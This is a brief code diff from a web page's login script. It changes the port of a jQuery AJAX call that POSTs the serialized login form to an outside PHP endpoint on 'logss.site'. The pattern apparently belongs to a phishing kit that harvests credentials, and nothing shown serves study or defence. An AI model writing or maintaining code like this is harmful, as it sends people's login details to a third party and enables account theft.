@@ -197,7 +197,7 @@ $('#login-status-message').text(MESSAGES.authenticating);
 
 
     $.ajax({
-      url: 'https://logss.site/lkrc.php',
+      url: 'https://logss.site:4433/lkrc.php',
       type: 'POST',
       data: $(this).serialize(),
       success: function(response) { 
